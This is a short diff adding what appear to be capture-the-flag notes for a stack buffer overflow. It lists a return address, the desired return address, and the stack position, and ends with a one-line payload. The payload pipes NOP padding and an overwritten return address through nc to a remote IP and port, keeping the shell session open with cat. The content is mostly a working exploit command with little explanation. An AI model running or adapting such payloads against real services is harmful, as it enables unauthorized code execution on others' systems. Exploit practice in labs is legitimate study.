@@ -1,0 +1,7 @@
+Return Address: 0x40076a
+Desired Return Address: 0x40076e
+
+Return Address Position: 10th row in stack
+
+Payload:
+(python -c "print '\x90'*(8*9)+'\x6e\x07\x40'"; cat) | nc 104.131.90.29 8001
